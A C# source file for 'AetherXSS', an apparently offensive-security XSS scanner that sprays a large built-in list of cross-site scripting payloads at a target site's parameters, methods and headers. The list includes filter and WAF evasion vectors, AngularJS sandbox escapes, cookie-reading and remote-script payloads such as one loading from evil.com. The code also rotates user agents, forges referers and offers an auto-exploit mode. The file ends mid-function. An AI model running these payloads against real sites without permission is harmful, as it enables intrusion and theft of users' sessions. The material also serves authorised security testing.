using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;
using System.Text;
using System.Net.Http.Headers;
using System.Web;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Diagnostics;
using Newtonsoft.Json;
using System.Xml;
using AetherXSS;
HttpClient client = new HttpClient();
bool useColor = true;
bool verbose = false;
bool autoExploit = false;
bool testMethods = false;
bool fuzzHeaders = false;
int delayBetweenRequests = 0;
int maxThreads = 5;
List<string> customPayloads = new List<string>();
List<string> discoveredVulnerabilities = new List<string>();
string reportPath = "xss_report.html";
HashSet<string> testedUrls = new HashSet<string>();
Dictionary<string, int> statistics = new Dictionary<string, int>
        {
            { "testedUrls", 0 },
            { "vulnerableUrls", 0 },
            { "failedRequests", 0 },
            { "parametersFound", 0 }
        };

// Add missing WAF bypass payloads dictionary
Dictionary<string, string> wafBypassPayloads = new Dictionary<string, string>
        {
            { "CloudFlare", "<svg onload=alert(1)>" },
            { "ModSecurity", "<img src=x onerror=alert(1)>" },
            { "Imperva", "javascript:alert(1)" },
            { "F5 BIG-IP", "<body onload=alert(1)>" },
            { "Akamai", "<script>alert(1)</script>" }
        };

// Expanded list of XSS payloads
List<string> xssPayloads = new List<string>
        {
            // Basic XSS vectors
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "<select autofocus onfocus=alert('XSS')>",
            "<textarea autofocus onfocus=alert('XSS')>",
            "<keygen autofocus onfocus=alert('XSS')>",
            "<video><source onerror=\"javascript:alert('XSS')\">",
            
            // HTML5 vectors
            "<audio src=x onerror=alert('XSS')>",
            "<video src=x onerror=alert('XSS')>",
            "<math><maction actiontype=\"statusline#\" xlink:href=\"javascript:alert('XSS')\">CLICKME</maction>",
            "<form><button formaction=\"javascript:alert('XSS')\">CLICKME</button>",
            "<isindex type=image src=1 onerror=alert('XSS')>",
            "<object data=\"javascript:alert('XSS')\">",
            "<embed src=\"javascript:alert('XSS')\">",
            
            // Event handlers
            "<div onmouseover=\"alert('XSS')\">hover me</div>",
            "<div onclick=\"alert('XSS')\">click me</div>",
            "<body onscroll=alert('XSS')><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>",
            
            // Obfuscated payloads
            "<img src=\"javascript:alert('XSS');\">",
            "<img src=javascript:alert('XSS')>",
            "<img src=JaVaScRiPt:alert('XSS')>",
            "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
            "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
            "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
            
            // Data URI schemes
            "<img src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
            "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
            
            // Filter evasion
            "<script>alert(1)</script>",
            "<script>alert(document.cookie)</script>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<<script>alert('XSS');//<</script>",
            "<script src=//evil.com/xss.js></script>",
            "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29')</script>",
            "<img src=x:alert(alt) onerror=eval(src) alt='XSS'>",
            
            // AngularJS specific
            "{{constructor.constructor('alert(\"XSS\")')()}}",
            "<div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
            "<x ng-app>{{constructor.constructor('alert(1)')()}}</x>",
            
            // DOM-based XSS
            "<script>document.write('<img src=x onerror=alert(1)>')</script>",
            "<script>document.write('<iframe src=\"javascript:alert(1)\">')</script>",
            
            // Advanced payloads
            "\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
            "<svg><animate attributeName=x dur=1s onbegin=alert('XSS')>",
            "<svg><animate attributeName=x dur=1s onend=alert('XSS')>",
            "<svg><set attributeName=x dur=1s onbegin=alert('XSS')>",
            "<svg><set attributeName=x dur=1s onend=alert('XSS')>",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><style>{font-family:'<iframe/onload=alert(\"XSS\")'}</style>",
            
            // Exotic payloads
            "<marquee onstart=alert('XSS')>",
            "<div/onmouseover='alert(\"XSS\")'>X</div>",
            "<details open ontoggle=alert('XSS')>",
            "<iframe src=\"javascript:alert(`XSS`)\">"
        };

// Expanded list of User-Agents
List<string> userAgents = new List<string>
        {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.78",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; OnePlus 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; OnePlus 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)"
        };

// Expanded list of common HTTP headers
Dictionary<string, string> commonHeaders = new Dictionary<string, string>
        {
            { "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" },
            { "Accept-Language", "en-US,en;q=0.5" },
            { "Accept-Encoding", "gzip, deflate, br" },
            { "DNT", "1" },
            { "Connection", "keep-alive" },
            { "Upgrade-Insecure-Requests", "1" },
            { "Cache-Control", "max-age=0" },
            { "TE", "Trailers" }
        };

// Expanded list of common HTTP referers
List<string> commonReferers = new List<string>
        {
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://www.yahoo.com/",
            "https://www.facebook.com/",
            "https://www.twitter.com/",
            "https://www.linkedin.com/",
            "https://www.github.com/",
            "https://www.youtube.com/",
            "https://www.instagram.com/",
            "https://www.reddit.com/"
        };

// Common parameters to check for XSS
List<string> commonParameters = new List<string>
        {
            "q", "s", "search", "id", "action", "page", "keywords", "query", "name", "key",
            "p", "month", "year", "category", "type", "file", "sort", "lang", "term", "debug",
            "from", "to", "subject", "message", "content", "body", "title", "url", "view", "mode",
            "text", "data", "redirect", "redirect_uri", "return", "return_url", "next", "redir",
            "callback", "jsonp", "api_key", "token", "user", "username", "password", "pass", "login",
            "email", "account", "item", "keyword", "tag", "ref", "show", "source", "destination",
            "path", "dir", "date", "time", "timestamp", "start", "end", "width", "height", "size",
            "first", "last", "format", "template", "session", "version", "code", "error", "msg",
            "return_to", "target", "theme", "ui", "style", "language", "offset", "limit", "count",
            "page_id", "post_id", "comment_id", "user_id", "group_id", "topic_id", "thread_id",
            "preview", "comment", "description", "note", "order", "sort_by", "filter", "search"
        };

// Content type wordlist
List<string> contentTypes = new List<string>
        {
            "application/x-www-form-urlencoded",
            "application/json",
            "multipart/form-data",
            "text/plain",
            "application/xml"
        };

// HTTP methods to test
List<string> httpMethods = new List<string>
        {
            "GET",
            "POST",
            "PUT",
            "DELETE",
            "OPTIONS",
            "HEAD",
            "PATCH"
        };

// DOM XSS sinks to search for in responses
List<string> domXssSinks = new List<string>
        {
            "document.write(",
            "document.writeln(",
            "document.domain",
            "element.innerHTML",
            "element.outerHTML",
            "element.insertAdjacentHTML",
            "element.onevent",
            "eval(",
            "setTimeout(",
            "setInterval(",
            "location",
            "location.href",
            "location.search",
            "location.hash",
            "location.pathname",
            "document.URL",
            "document.documentURI",
            "document.URLUnencoded",
            "document.baseURI",
            "document.referrer",
            "window.name",
            "history.pushState(",
            "history.replaceState(",
            "localStorage",
            "sessionStorage",
            "$().html(",
            "$().html(",
            "angular.callbacks",
            "execScript(",
            "crypto.generateCRMFRequest(",
            "ScriptElement.src",
            "Function(",
            "setImmediate(",
            "range.createContextualFragment("
        };

void PrintColored(string message, ConsoleColor color)
{
    if (useColor)
    {
        Console.ForegroundColor = color;
        Console.WriteLine(message);
        Console.ResetColor();
    }
    else
    {
        Console.WriteLine(message);
    }
}

void AddHeaders(HttpRequestMessage request, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
{
    // Add common headers
    foreach (var header in commonHeaders)
    {
        request.Headers.Add(header.Key, header.Value);
    }

    // Add custom user agent if provided, otherwise use a random one
    if (!string.IsNullOrEmpty(customUserAgent))
    {
        request.Headers.Add("User-Agent", customUserAgent);
    }
    else
    {
        Random rand = new Random();
        request.Headers.Add("User-Agent", userAgents[rand.Next(userAgents.Count)]);
    }

    // Add cookie if provided
    if (!string.IsNullOrEmpty(cookie))
    {
        request.Headers.Add("Cookie", cookie);
    }

    // Add random referer
    Random refRand = new Random();
    request.Headers.Add("Referer", commonReferers[refRand.Next(commonReferers.Count)]);

    // Add extra headers if provided
    if (extraHeaders != null)
    {
        foreach (var header in extraHeaders)
        {
            request.Headers.Add(header.Key, header.Value);
        }
    }
}

void PrintBanner()
{
    AnimatedUI.PrintBanner();
}

void ShowSystemInfo()
{
    // Check configuration
    Console.ForegroundColor = ConsoleColor.Yellow;
    Console.WriteLine("\n[*] Initializing AetherXSS scanner...");

    // Config file check
    string configPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".aetherxss.config");
    Console.WriteLine($"[*] Looking for configuration file at \"{configPath}\"");

    // System checks
    int currentThreads = Environment.ProcessorCount;
    Console.WriteLine($"[*] Detected CPU threads: {currentThreads}");

    // Memory check
    try
    {
        var process = Process.GetCurrentProcess();
        long memoryMB = process.WorkingSet64 / 1024 / 1024;
        Console.WriteLine($"[*] Available memory: {memoryMB} MB");
    }
    catch { }

    // Tool information
    Console.WriteLine($"[*] AetherXSS Version: 1.0");
    Console.WriteLine($"[*] Payloads loaded: Default XSS vector collection ({xssPayloads.Count} vectors)");
    Console.WriteLine($"[*] Target scope: Reflected XSS, Stored XSS, DOM-based XSS");
    Console.WriteLine($"[*] Advanced detection capabilities: WAF bypass, context-aware analysis");

    Console.ForegroundColor = ConsoleColor.Cyan;
    Console.WriteLine("\n[*] Options:");
    Console.WriteLine($"    Use --verbose for more detailed scan information");
    Console.WriteLine($"    Use --auto-exploit to attempt automatic payload execution");
    Console.WriteLine($"    Use --delay to set request delay (for rate limiting)");
    Console.WriteLine($"    Use --wordlist to add custom payloads");

    Console.ResetColor();
    Console.WriteLine();

    // Tool initialization - Fix the missing reference
    AnimatedUI.ShowLoadingAnimation("Initializing XSS scanner...", 2000);
}

Stopwatch stopwatch = new Stopwatch();
stopwatch.Start();

try
{
    if (args.Length < 2 || args[0] != "--url")
    {
        PrintBanner();
        ShowSystemInfo();  // Add system info display
        Console.WriteLine("Usage: AetherXSS --url <target_site> [options]");
        Console.WriteLine("\nOptions:");
        Console.WriteLine("  --url <url>              Target URL to scan (required)");
        Console.WriteLine("  --no-color               Disable colored output");
        Console.WriteLine("  --proxy <proxy_url>      Use proxy for requests");
        Console.WriteLine("  --cookie <cookie_data>   Use custom cookies");
        Console.WriteLine("  --headers <h1:v1,...>    Use custom HTTP headers");
        Console.WriteLine("  --user-agent <ua>        Use specific User-Agent");
        Console.WriteLine("  --wordlist <file>        Load custom payload list");
        Console.WriteLine("  --threads <num>          Number of concurrent threads (default: 5)");
        Console.WriteLine("  --delay <ms>             Delay between requests (milliseconds)");
        Console.WriteLine("  --timeout <sec>          Request timeout (seconds) (default: 30)");
        Console.WriteLine("  --output <file>          Save results to file");
        Console.WriteLine("  --verbose                Show detailed output");
        Console.WriteLine("  --dom-scan               Enable DOM-based XSS scanning");
        Console.WriteLine("  --crawl                  Crawl website for additional URLs");
        Console.WriteLine("  --depth <num>            Crawl depth (default: 2)");
        Console.WriteLine("  --params                 Test common parameter names");
        Console.WriteLine("  --methods                Test different HTTP methods");
        Console.WriteLine("  --fuzz-headers           Fuzz HTTP headers for XSS");
        Console.WriteLine("  --auto-exploit           Attempt to automatically exploit found vulnerabilities");
        Console.WriteLine("  --help                   Show this help message");
        return;
    }

    PrintBanner();

    string targetUrl = args[1];
    string proxy = null;
    string cookie = null;
    string userAgent = null;
    string wordlistPath = null;
    bool domScanEnabled = false;
    bool crawlEnabled = false;
    int crawlDepth = 2;
    bool testParamsEnabled = false;
    int timeout = 30;
    string outputFile = null;
    Dictionary<string, string> extraHeaders = new Dictionary<string, string>();

    // Test Support for HTTP/2
    if (verbose)
    {
        PrintColored("[*] Testing HTTP/2 support...", ConsoleColor.Cyan);
    }
    await TestHttp2Request(targetUrl, "<script>alert('XSS')</script>", cookie, extraHeaders, userAgent);

    for (int i = 2; i < args.Length; i++)
    {
        switch (args[i])
        {
            case "--no-color":
                useColor = false;
                break;
            case "--proxy" when i + 1 < args.Length:
                proxy = args[++i];
                break;
            case "--cookie" when i + 1 < args.Length:
                cookie = args[++i];
                break;
            case "--headers" when i + 1 < args.Length:
                string[] headers = args[++i].Split(',');
                foreach (var header in headers)
                {
                    string[] keyValue = header.Split(':');
                    if (keyValue.Length == 2) extraHeaders[keyValue[0].Trim()] = keyValue[1].Trim();
                }
                break;
            case "--user-agent" when i + 1 < args.Length:
                userAgent = args[++i];
                break;
            case "--wordlist" when i + 1 < args.Length:
                wordlistPath = args[++i];
                break;
            case "--threads" when i + 1 < args.Length:
                if (int.TryParse(args[++i], out int threads) && threads > 0)
                    maxThreads = threads;
                break;
            case "--delay" when i + 1 < args.Length:
                if (int.TryParse(args[++i], out int delay) && delay >= 0)
                    delayBetweenRequests = delay;
                break;
            case "--timeout" when i + 1 < args.Length:
                if (int.TryParse(args[++i], out int timeoutSec) && timeoutSec > 0)
                    timeout = timeoutSec;
                break;
            case "--output" when i + 1 < args.Length:
                outputFile = args[++i];
                break;
            case "--verbose":
                verbose = true;
                break;
            case "--dom-scan":
                domScanEnabled = true;
                break;
            case "--crawl":
                crawlEnabled = true;
                break;
            case "--depth" when i + 1 < args.Length:
                if (int.TryParse(args[++i], out int depth) && depth > 0)
                    crawlDepth = depth;
                break;
            case "--params":
                testParamsEnabled = true;
                break;
            case "--methods":
                testMethods = true;
                break;
            case "--fuzz-headers":
                fuzzHeaders = true;
                break;
            case "--auto-exploit":
                autoExploit = true;
                break;
            case "--help":
                PrintBanner();
                Console.WriteLine("Usage: AetherXSS --url <target_site> [options]");
                return;
        }
    }

    // Set HTTP client timeout
    client.Timeout = TimeSpan.FromSeconds(timeout);

    // Set proxy if specified
    if (!string.IsNullOrEmpty(proxy))
    {
        WebProxy webProxy = new WebProxy(proxy);
        HttpClientHandler handler = new HttpClientHandler
        {
            Proxy = webProxy,
            UseProxy = true
        };
        client.DefaultRequestHeaders.Add("Via", "1.1 AetherXSS");
    }

    // Load custom payloads if wordlist is provided
    if (!string.IsNullOrEmpty(wordlistPath) && File.Exists(wordlistPath))
    {
        try
        {
            AnimatedUI.ShowSpinner("Loading custom payloads from wordlist");
            string[] payloads = File.ReadAllLines(wordlistPath);
            customPayloads.AddRange(payloads);
            PrintColored($"[*] Loaded {payloads.Length} custom payloads from {wordlistPath}", ConsoleColor.Cyan);
        }
        catch (Exception ex)
        {
            PrintColored($"[!] Error loading wordlist: {ex.Message}", ConsoleColor.Yellow);
        }
    }

    // Set output file if specified
    if (!string.IsNullOrEmpty(outputFile))
    {
        reportPath = outputFile;
    }

    // Show detailed target information
    AnimatedUI.ShowTargetInfo(targetUrl);

    // Display configuration information
    var configInfo = new Dictionary<string, object>
                {
                    {"Target URL", targetUrl},
                    {"Timeout", $"{timeout} seconds"},
                    {"Threads", maxThreads},
                    {"Delay", delayBetweenRequests > 0 ? $"{delayBetweenRequests}ms" : "No delay"},
                    {"Proxy", proxy ?? "None"},
                    {"Custom User-Agent", userAgent ?? "Random"},
                    {"DOM-XSS Scanning", domScanEnabled ? "Enabled" : "Disabled"},
                    {"Crawling", crawlEnabled ? $"Enabled (Depth: {crawlDepth})" : "Disabled"},
                    {"Test Parameters", testParamsEnabled ? "Enabled" : "Disabled"},
                    {"Test HTTP Methods", testMethods ? "Enabled" : "Disabled"},
                    {"Header Fuzzing", fuzzHeaders ? "Enabled" : "Disabled"},
                    {"Auto-Exploit", autoExploit ? "Enabled" : "Disabled"},
                    {"Verbose Mode", verbose ? "Enabled" : "Disabled"},
                    {"Output File", outputFile ?? "None"},
                    {"Total Payloads", xssPayloads.Count + customPayloads.Count}
                };

    AnimatedUI.ShowConfigInfo(configInfo);

    // Preparing scan message
    AnimatedUI.ShowSpinner("Preparing scan environment", 2000);

    List<string> urlsToTest = new List<string> { targetUrl };

    // Crawl for additional URLs if enabled
    if (crawlEnabled)
    {
        PrintColored("[*] Crawling website, please wait...", ConsoleColor.Cyan);
        var crawledUrls = await CrawlWebsite(targetUrl, crawlDepth);
        urlsToTest.AddRange(crawledUrls);
        PrintColored($"[+] Found a total of {crawledUrls.Count} URLs.", ConsoleColor.Cyan);
    }

    // Show initialization message
    AnimatedUI.ShowSpinner("Initializing scan engine", 1500);
    AnimatedUI.ShowRandomHackPhrase();

    // Create a semaphore to limit concurrent tasks
    SemaphoreSlim semaphore = new SemaphoreSlim(maxThreads);
    List<Task> tasks = new List<Task>();

    // Show scan start message
    Console.WriteLine();
    PrintColored($"[+] Starting XSS scan with {maxThreads} threads", ConsoleColor.Green);
    PrintColored($"[*] Scan initiated at {DateTime.Now.ToString("HH:mm:ss")}", ConsoleColor.Cyan);
    Console.WriteLine();

    // Test each URL
    foreach (var url in urlsToTest)
    {
        await semaphore.WaitAsync();

        tasks.Add(Task.Run(async () =>
        {
            try
            {
                // Show a random hack message before each test
                AnimatedUI.ShowRandomHackPhrase();

                // Test regular payloads
                var allPayloads = xssPayloads.Concat(customPayloads).ToList();
                int payloadCount = 0;

                foreach (var payload in allPayloads)
                {
                    payloadCount++;
                    // Show scan progress
                    AnimatedUI.ShowScanProgress(url, payloadCount, allPayloads.Count);

                    try
                    {
                        await TestGetRequest(url, payload, cookie, extraHeaders, userAgent);

                        // Apply delay if specified
                        if (delayBetweenRequests > 0)
                        {
                            await Task.Delay(delayBetweenRequests);
                        }

                        await TestPostRequest(url, payload, cookie, extraHeaders, userAgent);

                        // Apply delay if specified
                        if (delayBetweenRequests > 0)
                        {
                            await Task.Delay(delayBetweenRequests);
                        }

                        // Test different HTTP methods if enabled
                        if (testMethods)
                        {
                            foreach (var method in httpMethods.Where(m => m != "GET" && m != "POST"))
                            {
                                await TestCustomMethodRequest(url, method, payload, cookie, extraHeaders, userAgent);

                                if (delayBetweenRequests > 0)
                                {
                                    await Task.Delay(delayBetweenRequests);
                                }
                            }
                        }

                        // Fuzz headers if enabled
                        if (fuzzHeaders)
                        {
                            await TestHeaderInjection(url, payload, cookie, extraHeaders, userAgent);

                            if (delayBetweenRequests > 0)
                            {
                                await Task.Delay(delayBetweenRequests);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        if (verbose)
                        {
                            PrintColored($"[!] Error testing payload {payload}: {ex.Message}", ConsoleColor.Yellow);
                        }

                        lock (statistics)
                        {
                            statistics["failedRequests"]++;
                        }
                    }

                    await Task.Delay(delayBetweenRequests);
                }

                // Check for DOM-based XSS if enabled
                if (domScanEnabled)
                {
                    PrintColored($"[*] Scanning for DOM XSS on {url}...", ConsoleColor.Cyan);
                    await ScanForDomXSS(url, cookie, extraHeaders, userAgent);

                    if (delayBetweenRequests > 0)
                    {
                        await Task.Delay(delayBetweenRequests);
                    }
                }

                // Check for common parameters if enabled
                if (testParamsEnabled)
                {
                    foreach (var param in commonParameters)
                    {
                        // Test parameter injection
                        await TestParameterInjection(url, param, "<script>alert('XSS')</script>", cookie, extraHeaders, userAgent);

                        if (delayBetweenRequests > 0)
                        {
                            await Task.Delay(delayBetweenRequests);
                        }
                    }
                }

            }

            catch (Exception ex)
            {
                if (verbose)
                {
                    PrintColored($"[!] Error testing URL {url}: {ex.Message}", ConsoleColor.Yellow);
                }
            }
            finally
            {
                semaphore.Release();
            }
        }));
    }

    // Wait for all tasks to complete
    await Task.WhenAll(tasks);

    // Generate report
    if (!string.IsNullOrEmpty(outputFile))
    {
        AnimatedUI.ShowSpinner("Generating report", 1500);
        GenerateReport(reportPath);
        PrintColored($"[+] Report saved: {reportPath}", ConsoleColor.Cyan);
    }

    stopwatch.Stop();

    // Create a visual completion indicator
    Console.WriteLine();
    Console.WriteLine("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
    Console.ForegroundColor = ConsoleColor.Green;
    Console.WriteLine("                   SCAN COMPLETED SUCCESSFULLY");
    Console.ResetColor();
    Console.WriteLine("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

    // Show time metrics
    TimeSpan elapsed = stopwatch.Elapsed;
    Console.WriteLine();
    Console.Write("  ");
    Console.ForegroundColor = ConsoleColor.Yellow;
    Console.Write("Duration: ");
    Console.ResetColor();
    Console.WriteLine($"{elapsed.TotalSeconds:F2} seconds ({elapsed.Minutes} min {elapsed.Seconds} sec)");

    // Show requests per second
    int totalRequests = statistics["testedUrls"];
    double requestsPerSecond = totalRequests / elapsed.TotalSeconds;
    Console.Write("  ");
    Console.ForegroundColor = ConsoleColor.Yellow;
    Console.Write("Performance: ");
    Console.ResetColor();
    Console.WriteLine($"{requestsPerSecond:F2} requests/second");

    // Show scan start and end times
    DateTime endTime = DateTime.Now;
    DateTime startTime = endTime - elapsed;
    Console.Write("  ");
    Console.ForegroundColor = ConsoleColor.Yellow;
    Console.Write("Started: ");
    Console.ResetColor();
    Console.WriteLine(startTime.ToString("yyyy-MM-dd HH:mm:ss"));

    Console.Write("  ");
    Console.ForegroundColor = ConsoleColor.Yellow;
    Console.Write("Finished: ");
    Console.ResetColor();
    Console.WriteLine(endTime.ToString("yyyy-MM-dd HH:mm:ss"));

    Console.WriteLine();

    // Show scan summary
    AnimatedUI.ShowScanSummary(statistics);

    // Final message
    if (statistics["vulnerableUrls"] > 0)
    {
        PrintColored("\nVULNERABILITIES DETECTED! Review the scan results for details.", ConsoleColor.Red);
    }
    else
    {
        PrintColored("\nNo vulnerabilities detected in this scan.", ConsoleColor.Green);
    }

    // Tip message
    string[] tipMessages = new string[]
    {
                    "Tip: Always verify XSS findings manually before reporting them.",
                    "Tip: Regular security scanning is an essential part of web security.",
                    "Tip: Combine AetherXSS with other security tools for more thorough testing.",
                    "Tip: Use the --auto-exploit option for automated proof of concept."
    };

    Random random = new Random();
    Console.WriteLine();
    Console.ForegroundColor = ConsoleColor.Cyan;
    Console.WriteLine(tipMessages[random.Next(tipMessages.Length)]);
    Console.ResetColor();
}
catch (Exception ex)
{
    PrintColored($"[!] Unexpected error: {ex.Message}", ConsoleColor.Red);
    if (verbose)
    {
        Console.WriteLine(ex.StackTrace);
    }
}

async Task TestGetRequest(string url, string payload, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
{
    string encodedPayload = HttpUtility.UrlEncode(payload);
    string testUrl = url.Contains("?") ? $"{url}&xss={encodedPayload}" : $"{url}?xss={encodedPayload}";

    try
    {
        HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, testUrl);
        AddHeaders(request, cookie, extraHeaders, customUserAgent);

        HttpResponseMessage response = await client.SendAsync(request);
        string responseBody = await response.Content.ReadAsStringAsync();

        // Check for WAF presence
        if (DetectWAF(response, responseBody))
        {
            if (verbose)
            {
                PrintColored($"\n[!] WAF detected. Attempting bypass techniques for {url}", ConsoleColor.Yellow);
            }

            // Try to use specific WAF bypass payloads
            await TestWAFBypass(url, cookie, extraHeaders, customUserAgent);
        }

        lock (statistics)
        {
            statistics["testedUrls"]++;
        }

        // Enhanced detection logic
        if (IsXssVulnerable(responseBody, payload))
        {
            lock (discoveredVulnerabilities)
            {
                discoveredVulnerabilities.Add($"GET: {testUrl}");
            }

            lock (statistics)
            {
                statistics["vulnerableUrls"]++;
            }

            PrintColored($"\n[!] XSS Vulnerability Detected! {testUrl}", ConsoleColor.Red);
            AnimatedUI.ShowVulnerabilityFound(testUrl, "GET Parameter Reflection");

            // Analyze the vulnerability context
            string context = DetermineXssContext(responseBody, payload);
            if (!string.IsNullOrEmpty(context))
            {
                PrintColored($"  Context: {context}", ConsoleColor.Yellow);
            }

            if (autoExploit)
            {
                await AutoExploit(testUrl, "GET");
            }
        }
        else if (verbose)
        {
            PrintColored($"\n[-] {testUrl} appears clean.", ConsoleColor.Green);
        }
    }
    catch (Exception ex)
    {
        lock (statistics)
        {
            statistics["failedRequests"]++;
        }

        if (verbose)
        {
            PrintColored($"\n[!] Error in request to {testUrl}: {ex.Message}", ConsoleColor.Yellow);
        }
    }
}

async Task TestHttp2Request(string url, string payload, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
{
    try
    {
        HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url);
        AddHeaders(request, cookie, extraHeaders, customUserAgent);

        // Use HTTP/2 protocol
        HttpClientHandler handler = new HttpClientHandler
        {
            AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate
        };
